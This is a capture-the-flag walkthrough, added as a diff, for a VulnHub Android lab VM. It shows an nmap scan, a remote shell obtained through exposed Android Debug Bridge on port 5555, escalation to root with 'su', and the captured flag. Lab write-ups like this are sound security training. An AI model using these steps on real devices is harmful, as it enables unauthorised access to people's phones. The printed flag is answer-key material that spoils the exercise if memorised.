@@ -1,0 +1,97 @@
+Diificulty: Easy
+source: vulnhub
+
+Download link: https://www.vulnhub.com/entry/android4-1,233/
+
+STEP1:  
+Scan result:
+┌─[root@kali]─[~]
+└──╼ # nmap -A -p 1-65535 192.168.43.54
+Nmap scan report for android-25abe18209db8058 (192.168.43.54)
+Host is up (0.00022s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE  VERSION
+5555/tcp  open  freeciv?
+8080/tcp  open  http     PHP cli server 5.5 or later
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Deface by Good Hackers
+22000/tcp open  ssh      Dropbear sshd 2014.66 (protocol 2.0)
+| ssh-hostkey: 
+|_  521 46:13:43:49:24:88:06:85:6c:75:93:73:b5:1d:8f:28 (ECDSA)
+MAC Address: 08:00:27:B4:66:B5 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms android-25abe18209db8058 (192.168.43.54)
+
+
+STEP2 :
+Port 5555 indicating android debug bridge which is exposed when developer options in the settings menu of an android device are turned on. Thus install ADB on the kali machine and use ADB <ip> to connect to the IP and get its remote shell,
+
+result:
+┌─[root@kali]─[~]
+└──╼ # adb connect 192.168.43.54:5555
+connected to 192.168.43.54:5555
+
+STEP3:
+use adb shell command to get the remote shell  for the IP.
+└──╼ # adb shell
+3006(net_bw_stats)@x86:/ $ id
+uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),
+1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
+3003(inet),3006(net_bw_stats)
+uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),
+1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
+3003(inet),
+
+you can also additionally do this by doing phonesploit. phonesploit is a tool for kali linux which is used to exploit android devices using their IP
+command : phonesploit <IP>
+
+STEP4:
+We want to be root since the flag is located in the /data/root/ directory. use sudo su command once you have get the shell to get root privileges.
+Result:
+3006(net_bw_stats)@x86:/ $ su root
+uid=0(root) gid=0(root)@x86:/ # ls
+acct
+cache
+config
+d
+data
+default.prop
+dev
+etc
+file_contexts
+init
+init.bluetooth.rc
+init.environ.rc
+init.rc
+init.superuser.rc
+init.trace.rc
+init.usb.rc
+init.x86.rc
+lib08;#0e0e0e\
+mnt
+proc
+property_contexts
+sbin
+sdcard
+seapp_contexts
+sepolicy
+storage
+sys
+system
+ueventd.android_x86.rc
+ueventd.rc
+vendor
+x86.prop
+2|uid=0(root) gid=0(root)@x86:/ # cd /data/root
+uid=0(root) gid=0(root)@x86:/data/root # ls
+flag.txt
+
+The last file which is flag.txt contains the flag.
+THEREFORE THE ROOT FLAG: ANDROID{u_GOT_root_buddy}
